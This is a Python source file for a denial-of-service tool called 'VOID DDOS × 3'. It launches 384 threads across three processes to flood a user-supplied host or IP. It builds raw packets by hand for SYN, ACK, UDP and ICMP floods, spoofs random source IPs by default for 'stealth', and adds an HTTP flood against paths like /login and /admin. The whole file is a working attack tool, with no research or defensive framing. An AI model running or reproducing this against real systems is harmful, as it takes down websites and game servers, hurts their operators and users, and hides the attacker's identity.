#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID DDOS × 3 — Triple Instance Launcher (FIXED)
# ##  3 simultaneous attack processes · 384 threads · @lfw.k4rma_
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet")]:
        try: __import__(mod)
        except ImportError:
            try:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q",
                    "--break-system-packages"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q"],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

_ensure_deps()

import struct, socket, random, threading, time, re, select, ctypes
import multiprocessing as mp
from rich.console import Console
from rich.text    import Text
from rich.align   import Align
from rich.rule    import Rule
from rich.panel   import Panel
from rich.table   import Table
from rich.live    import Live
from rich         import box
import pyfiglet

console    = Console()

# ══════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════
N_INSTANCES  = 3
N_THREADS    = 128   # per instance → 384 total
POOL_SIZE    = 1000
BATCH_REPORT = 100
BUF_SIZE     = 8 * 1024 * 1024
USE_SPOOFING = True  # Set to False to see replies (but less stealth)

# ══════════════════════════════════════════════════════════════════
# PACKET ENGINE
# ══════════════════════════════════════════════════════════════════

def _checksum(data):
    if len(data) % 2: data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i+1]
    s = (s >> 16) + (s & 0xffff); s += s >> 16
    return ~s & 0xffff

_IP_POOL   = []
_PORT_POOL = []

def _init_pools():
    global _IP_POOL, _PORT_POOL
    for _ in range(10_000):
        a = random.randint(1,223)
        while a in (10,127,169,172,192): a = random.randint(1,223)
        _IP_POOL.append(f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
    _PORT_POOL = [random.randint(1024,65535) for _ in range(10_000)]

F_SYN=0x002; F_ACK=0x010; F_RST=0x004; F_FIN=0x001; F_PSH=0x008

def _ip_header(src,dst,proto,plen):
    sid=random.randint(0,65535); ttl=random.randint(48,128)
    s=socket.inet_aton(src); d=socket.inet_aton(dst)
    h=struct.pack('!BBHHHBBH4s4s',(4<<4)|5,0,20+plen,sid,0,ttl,proto,0,s,d)
    return struct.pack('!BBHHHBBH4s4s',(4<<4)|5,0,20+plen,sid,0,ttl,proto,_checksum(h),s,d)

def _tcp_seg(si,di,sp,dp,flags):
    seq=random.randint(0,2**32-1); win=random.randint(1024,65535)
    off=(5<<4)|0
    seg=struct.pack('!HHIIBBHHH',sp,dp,seq,0,off,flags,win,0,0)
    ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,6,len(seg))
    chk=_checksum(ps+seg)
    return struct.pack('!HHIIBBHHH',sp,dp,seq,0,off,flags,win,chk,0)

def _udp_seg(si,di,sp,dp):
    data=random.randbytes(64); ln=8+len(data)
    seg=struct.pack('!HHHH',sp,dp,ln,0)+data
    ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,17,ln)
    chk=_checksum(ps+seg[:8]+data)
    return struct.pack('!HHHH',sp,dp,ln,chk)+data

def _icmp():
    id_=random.randint(0,65535); seq=random.randint(0,65535); pay=random.randbytes(56)
    h=struct.pack('!BBHHH',8,0,0,id_,seq)
    return struct.pack('!BBHHH',8,0,_checksum(h+pay),id_,seq)+pay

def _build_pkt(mk,si,di,sp,dp):
    if mk=="SYN":
        t=_tcp_seg(si,di,sp,dp,F_SYN); return _ip_header(si,di,6,len(t))+t
    elif mk=="ACK":
        t=_tcp_seg(si,di,sp,dp,F_ACK); return _ip_header(si,di,6,len(t))+t
    elif mk=="UDP":
        u=_udp_seg(si,di,sp,dp); return _ip_header(si,di,17,len(u))+u
    elif mk=="ICMP":
        ic=_icmp(); return _ip_header(si,di,1,len(ic))+ic
    return b''

def _build_pool(mk,tip,tport,size,real_src=None):
    if real_src:
        # Use real source IP to see replies
        return [_build_pkt(mk,real_src,tip,random.choice(_PORT_POOL),tport)
                for _ in range(size)]
    else:
        # Use spoofed IPs (stealth mode, no replies visible)
        return [_build_pkt(mk,random.choice(_IP_POOL),tip,random.choice(_PORT_POOL),tport)
                for _ in range(size)]

# ══════════════════════════════════════════════════════════════════
# WORKER PROCESS (FIXED)
# ══════════════════════════════════════════════════════════════════

def _http_worker(tip, tport, sent_v, replies_v, errors_v, stop_val):
    """HTTP flood - uses real connections so replies ARE visible"""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    ]
    paths = ["/","/index.html","/api","/login","/home","/search","/admin","/wp-admin"]
    
    while not stop_val.value:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((tip, tport))
            
            # Send request
            req = (f"GET {random.choice(paths)} HTTP/1.1\r\n"
                   f"Host: {tip}:{tport}\r\n"
                   f"User-Agent: {random.choice(agents)}\r\n"
                   f"Accept: */*\r\n"
                   f"Connection: close\r\n\r\n").encode()
            
            s.sendall(req)
            
            with sent_v.get_lock(): 
                sent_v.value += 1
            
            # FIXED: Proper reply detection - read until close or timeout
            reply_data = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    reply_data += chunk
            except socket.timeout:
                pass
            
            # Count as reply if we got ANY data back
            if reply_data:
                with replies_v.get_lock(): 
                    replies_v.value += 1
                    
        except Exception as e:
            with errors_v.get_lock(): 
                errors_v.value += 1
        finally:
            if s:
                try: s.close()
                except: pass
            # Small delay to prevent overwhelming local resources
            time.sleep(0.001)

def _raw_sender(tip, tport, mk, sent_v, errors_v, stop_val, real_src=None):
    """Raw socket flood - with optional real source IP for reply visibility"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUF_SIZE)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
        sock.setblocking(False)
        
        # Build packet pool
        pool = _build_pool(mk, tip, tport, POOL_SIZE, real_src)
        idx = batch = total = 0
        
        while not stop_val.value:
            try:
                sock.sendto(pool[idx], (tip, 0))
                idx = (idx + 1) % POOL_SIZE
                batch += 1
                total += 1
                
                if batch >= BATCH_REPORT:
                    with sent_v.get_lock():
                        sent_v.value += batch
                    batch = 0
                
                # Refresh pool periodically
                if total % (POOL_SIZE * 50) == 0:
                    pool = _build_pool(mk, tip, tport, POOL_SIZE, real_src)
                    idx = 0
                
                # Yield to prevent 100% CPU lock
                if total % 1000 == 0:
                    time.sleep(0)
                    
            except BlockingIOError:
                if batch:
                    with sent_v.get_lock():
                        sent_v.value += batch
                    batch = 0
                time.sleep(0.001)
            except OSError:
                with errors_v.get_lock():
                    errors_v.value += 1
                    
        if batch:
            with sent_v.get_lock():
                sent_v.value += batch
        sock.close()
        
    except PermissionError:
        stop_val.value = 1
    except Exception:
        pass

def _raw_listener(tip, tport, mk, replies_v, stop_val, attacker_ip):
    """
    FIXED: Raw socket listener that actually works
    Captures incoming packets destined for our machine
    """
    try:
        if mk in ("SYN", "ACK", "UDP"):
            # For TCP/UDP, we need to capture ALL traffic and filter
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        sock.setblocking(False)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, BUF_SIZE)
        
        while not stop_val.value:
            try:
                ready, _, _ = select.select([sock], [], [], 0.01)
                if not ready:
                    continue
                
                pkt, addr = sock.recvfrom(65535)
                if len(pkt) < 20:
                    continue
                
                # Parse IP header
                ip_header = struct.unpack('!BBHHHBBH4s4s', pkt[:20])
                ihl = (ip_header[0] & 0x0f) * 4
                proto = ip_header[6]
                src_ip = socket.inet_ntoa(ip_header[8])
                dst_ip = socket.inet_ntoa(ip_header[9])
                
                # Only count packets destined for us
                if dst_ip != attacker_ip:
                    continue
                
                # Skip localhost
                if src_ip in ("127.0.0.1", "0.0.0.0"):
                    continue
                
                # Parse based on protocol
                if proto == 6 and mk in ("SYN", "ACK"):  # TCP
                    if len(pkt) < ihl + 20:
                        continue
                    tcp_header = struct.unpack('!HHIIBBHHH', pkt[ihl:ihl+20])
                    src_port = tcp_header[0]
                    dst_port = tcp_header[1]
                    flags = tcp_header[5]
                    
                    # Check if this is a reply to our target port
                    if src_port == tport:
                        # SYN-ACK or RST is a reply
                        if flags & (F_SYN | F_ACK) or flags & F_RST:
                            with replies_v.get_lock():
                                replies_v.value += 1
                                
                elif proto == 1 and mk == "ICMP":  # ICMP
                    if len(pkt) < ihl + 1:
                        continue
                    icmp_type = pkt[ihl]
                    # Echo reply or time exceeded
                    if icmp_type == 0 or icmp_type == 11:
                        with replies_v.get_lock():
                            replies_v.value += 1
                            
                elif proto == 17 and mk == "UDP":  # UDP - ICMP Port Unreachable
                    # UDP replies are ICMP port unreachables
                    pass
                    
            except BlockingIOError:
                continue
            except Exception:
                continue
                
        sock.close()
    except Exception:
        pass

def worker_main(instance_id, tip, tport, mk, sent_v, replies_v, errors_v, stop_val, attacker_ip):
    """Entry point for each attack process."""
    _init_pools()
    threads = []

    if mk == "HTTP":
        # HTTP mode - real connections, replies visible
        for _ in range(N_THREADS):
            t = threading.Thread(target=_http_worker,
                args=(tip, tport, sent_v, replies_v, errors_v, stop_val), daemon=True)
            t.start()
            threads.append(t)
    else:
        # Raw mode
        if USE_SPOOFING:
            # Stealth mode - spoof IPs, no replies expected
            for _ in range(N_THREADS):
                t = threading.Thread(target=_raw_sender,
                    args=(tip, tport, mk, sent_v, errors_v, stop_val, None), daemon=True)
                t.start()
                threads.append(t)
            # Listener won't see replies with spoofed IPs, so skip it
            console.print(f"  [dim red][Instance {instance_id+1}] Stealth mode - replies hidden[/]")
        else:
            # Reply mode - use real IP
            for _ in range(N_THREADS):
                t = threading.Thread(target=_raw_sender,
                    args=(tip, tport, mk, sent_v, errors_v, stop_val, attacker_ip), daemon=True)
                t.start()
                threads.append(t)
            # Listener to catch replies
            lt = threading.Thread(target=_raw_listener,
                args=(tip, tport, mk, replies_v, stop_val, attacker_ip), daemon=True)
            lt.start()
            threads.append(lt)

    # Keep main thread alive
    while not stop_val.value:
        time.sleep(0.5)
        
    for t in threads:
        t.join(timeout=2.0)

# ══════════════════════════════════════════════════════════════════
# UI HELPERS
# ══════════════════════════════════════════════════════════════════

def _bar(ratio, width=22, col="bright_red"):
    filled = max(0, min(int(ratio * width), width))
    b = Text()
    b.append("█" * filled, style=col)
    b.append("░" * (width - filled), style="dim")
    return b

def banner():
    console.clear()
    fig = pyfiglet.figlet_format("VOID  x3", font="doom")
    txt = Text()
    for i, line in enumerate(fig.splitlines()):
        txt.append(line + "\n", style="bright_red" if i % 2 == 0 else "red")
    console.print(Align.center(txt))
    console.print(Align.center(Text(
        "triple instance · 3 processes · 384 threads · @lfw.k4rma_\n", style="dim red")))
    console.print(Rule(style="bright_red"))

MODES = {
    "1": {"label": "SYN Flood",  "key": "SYN",  "color": "bright_red"},
    "2": {"label": "UDP Flood",  "key": "UDP",  "color": "bright_cyan"},
    "3": {"label": "ICMP Flood", "key": "ICMP", "color": "yellow"},
    "4": {"label": "ACK Flood",  "key": "ACK",  "color": "bright_magenta"},
    "5": {"label": "HTTP Flood", "key": "HTTP", "color": "bright_green"},
}

def resolve(target):
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        return target
    try:
        ip = socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/] [bold yellow]{target}[/] → [white]{ip}[/]")
        return ip
    except Exception:
        return target

def get_local_ip():
    """Get the local IP for reply mode"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    if os.geteuid() != 0:
        banner()
        console.print("\n  [bold red][!][/]  Raw sockets need root — run with sudo\n"
                      "  [dim]sudo python3 ddos_triple.py[/]\n")
        return

    banner()
    console.print()

    # Get attacker IP for reply mode
    attacker_ip = get_local_ip()

    # Input
    console.print("  [bright_red]◈[/]  ", end="")
    raw_t = input("Target IP, hostname, or URL: ").strip()
    if not raw_t:
        console.print("  [red]No target.[/]")
        return
    raw_t = re.sub(r'^https?://', '', raw_t).split('/')[0].split(':')[0]
    tip = resolve(raw_t)

    console.print("  [bright_red]◈[/]  ", end="")
    port_raw = input("Port (80 websites · 443 HTTPS · 25565 Minecraft): ").strip()
    tport = int(port_raw) if port_raw.isdigit() else 80

    console.print()
    for k, m in MODES.items():
        console.print(f"  [bright_red][{k}][/]  [bold {m['color']}]{m['label']}[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ", end="")
    choice = input("Mode (1-5, default 1): ").strip()
    mode = MODES.get(choice, MODES["1"])

    # Spoofing option for raw modes
    global USE_SPOOFING
    if mode["key"] != "HTTP":
        console.print()
        console.print("  [bright_red]◈[/]  ", end="")
        spoof = input("Use IP spoofing? (Y=Stealth/No replies, N=See replies) [Y/n]: ").strip().lower()
        USE_SPOOFING = (spoof != "n" and spoof != "no")
        if USE_SPOOFING:
            console.print("  [dim red]Stealth mode: Replies will be hidden (sent to spoofed IPs)[/]")
        else:
            console.print(f"  [dim green]Reply mode: Using real IP {attacker_ip} to capture responses[/]")

    console.print()
    console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
    console.print(f"  [dim]Target   [/] [bold yellow]{tip}:{tport}[/]")
    console.print(f"  [dim]Mode     [/] [bold {mode['color']}]{mode['label']}[/]")
    if mode["key"] != "HTTP":
        console.print(f"  [dim]Spoofing [/] [bold {'red' if USE_SPOOFING else 'green'}]{'ON' if USE_SPOOFING else 'OFF'}[/]")
    console.print(f"  [dim]Engine   [/] [bold white]{N_INSTANCES} processes × {N_THREADS} threads = "
                  f"{N_INSTANCES*N_THREADS} total threads[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ", end="")
    if input("Start? (Y/N): ").strip().lower() not in ("y", "yes"):
        console.print("\n  [yellow]Aborted.[/]\n")
        return

    mk = mode["key"]
    col = mode["color"]
    label = mode["label"]

    # Shared counters
    sent_v = [mp.Value(ctypes.c_uint64, 0) for _ in range(N_INSTANCES)]
    replies_v = [mp.Value(ctypes.c_uint64, 0) for _ in range(N_INSTANCES)]
    errors_v = [mp.Value(ctypes.c_uint64, 0) for _ in range(N_INSTANCES)]
    stop_val = mp.Value(ctypes.c_int, 0)

    # Countdown
    console.print()
    for i in range(3, 0, -1):
        console.print(f"\r  [bold bright_red][!][/]  [white]Launching in [bright_red]{i}[/]...[/]", end="")
        time.sleep(1)
    console.print(f"\r  [bold bright_red][!!!][/]  [bright_red]FIRING 3 INSTANCES — {N_INSTANCES*N_THREADS} THREADS TOTAL              [/]")
    console.print()

    # Spawn worker processes
    procs = []
    for i in range(N_INSTANCES):
        p = mp.Process(
            target=worker_main,
            args=(i, tip, tport, mk, sent_v[i], replies_v[i], errors_v[i], stop_val, attacker_ip),
            daemon=True)
        p.start()
        procs.append(p)

    start = time.time()
    last_sent = [0] * N_INSTANCES
    last_replies = [0] * N_INSTANCES
    last_t = time.time()

    # Combined live dashboard
    try:
        from rich.console import Group
        with Live(console=console, refresh_per_second=4, screen=False) as live:
            while True:
                now = time.time()
                dt = max(now - last_t, 0.001)
                last_t = now
                
                snaps = [{
                    "sent": sent_v[i].value,
                    "replies": replies_v[i].value,
                    "errors": errors_v[i].value,
                } for i in range(N_INSTANCES)]

                # Per-instance PPS and RPS
                pps_each = []
                rps_each = []
                for i, s in enumerate(snaps):
                    pps_each.append((s["sent"] - last_sent[i]) / dt)
                    rps_each.append((s["replies"] - last_replies[i]) / dt)
                    last_sent[i] = s["sent"]
                    last_replies[i] = s["replies"]

                total_sent = sum(s["sent"] for s in snaps)
                total_replies = sum(s["replies"] for s in snaps)
                total_pps = sum(pps_each)
                total_rps = sum(rps_each)
                elap = now - start
                
                # Reply rate calculation
                reply_rate = (total_replies / total_sent * 100) if total_sent else 0.0

                # Instance rows
                inst_tbl = Table.grid(padding=(0, 2))
                inst_tbl.add_column()
                inst_tbl.add_column()
                inst_tbl.add_column()
                inst_tbl.add_column()
                inst_tbl.add_column()
                inst_tbl.add_column()
                inst_tbl.add_row(
                    Text("INST", style="dim"),
                    Text("SENT", style="dim"),
                    Text("REPLIES", style="dim"),
                    Text("PPS", style="dim"),
                    Text("RPS", style="dim"),
                    Text("ERRORS", style="dim"),
                )
                for i, s in enumerate(snaps):
                    inst_tbl.add_row(
                        Text(f"#{i+1}", style="bold bright_red"),
                        Text(f"{s['sent']:,}", style="bold white"),
                        Text(f"{s['replies']:,}", style="bold bright_green"),
                        Text(f"{pps_each[i]:,.0f}", style=f"bold {col}"),
                        Text(f"{rps_each[i]:,.0f}", style="bold bright_green"),
                        Text(f"{s['errors']:,}", style="dim red"),
                    )

                # Combined stats
                comb_tbl = Table.grid(padding=(0, 2))
                comb_tbl.add_column()
                comb_tbl.add_column()
                comb_tbl.add_column()
                comb_tbl.add_column()
                comb_tbl.add_row(
                    Text("TOTAL SENT", style="dim"),
                    Text(f"{total_sent:,}", style="bold white"),
                    Text("TOTAL REPLIES", style="dim"),
                    Text(f"{total_replies:,}", style="bold bright_green"),
                )
                comb_tbl.add_row(
                    Text("COMBINED PPS", style="dim"),
                    Text(f"{total_pps:,.0f}", style=f"bold {col}"),
                    Text("REPLY RATE", style="dim"),
                    Text(f"{reply_rate:.1f}%",
                         style="bright_green" if reply_rate > 50 else ("yellow" if reply_rate > 10 else "dim")),
                )
                comb_tbl.add_row(
                    Text("MODE", style="dim"),
                    Text(label, style=f"bold {col}"),
                    Text("UPTIME", style="dim"),
                    Text(f"{elap:.0f}s", style="bold white"),
                )

                rate_bar = Text()
                rate_bar.append("  RATE  ", style="bold white")
                rate_bar.append_text(_bar(min(total_pps / 500_000, 1.0), col=col))
                rate_bar.append(f"  {total_pps:,.0f} pps", style=f"bold {col}")

                reply_bar = Text()
                reply_bar.append("  REPLY ", style="bold white")
                reply_bar.append_text(_bar(min(total_rps / 10000, 1.0), col="bright_green"))
                reply_bar.append(f"  {total_rps:,.0f} rps", style="bold bright_green")

                # Warning about spoofing
                warning = ""
                if mk != "HTTP" and USE_SPOOFING:
                    warning = Text("\n  [Stealth mode: Replies sent to spoofed IPs - not visible]", style="dim red")

                panel = Panel(
                    Group(
                        inst_tbl, Text(""),
                        Rule("[dim red]COMBINED[/]", style="dim red"), Text(""),
                        comb_tbl, Text(""),
                        rate_bar, Text(""),
                        reply_bar, Text(""),
                        warning if warning else Text(""),
                        Text("\n  Ctrl+C to halt", style="dim red"),
                    ),
                    title=f"[bold bright_red]  VOID DDOS × {N_INSTANCES}  —  {N_INSTANCES*N_THREADS} THREADS  —  {'STEALTH' if mk != 'HTTP' and USE_SPOOFING else 'REPLY'} MODE  [/]",
                    border_style="bright_red",
                    box=box.DOUBLE_EDGE,
                )
                live.update(panel)
                time.sleep(0.25)

    except KeyboardInterrupt:
        pass

    # Stop all workers
    stop_val.value = 1
    for p in procs:
        p.join(timeout=3.0)

    # Final summary
    total_sent = sum(sent_v[i].value for i in range(N_INSTANCES))
    total_replies = sum(replies_v[i].value for i in range(N_INSTANCES))
    elap = time.time() - start
    reply_rate = (total_replies / total_sent * 100) if total_sent else 0.0

    console.print()
    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]", style="bright_red"))
    console.print(f"  [dim]Target         [/] [bold yellow]{tip}:{tport}[/]")
    console.print(f"  [dim]Mode           [/] [bold {col}]{label}[/]")
    console.print(f"  [dim]Spoofing       [/] [bold {'red' if USE_SPOOFING else 'green'}]{'ON' if USE_SPOOFING else 'OFF'}[/]")
    console.print(f"  [dim]Instances      [/] [bold white]{N_INSTANCES} processes × {N_THREADS} threads[/]")
    console.print(f"  [dim]Total sent     [/] [bold white]{total_sent:,}[/]")
    console.print(f"  [dim]Total replies  [/] [bold white]{total_replies:,}[/]")
    console.print(f"  [dim]Reply rate     [/] [{'bright_green' if reply_rate > 50 else 'bright_red'}]{reply_rate:.1f}%[/]")
    console.print(f"  [dim]Duration       [/] [bold white]{elap:.1f}s[/]")
    console.print()
    console.print(Rule(style="bright_red"))


if __name__ == "__main__":
    mp.set_start_method("fork")
    try:
        main()
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  {e}\n")
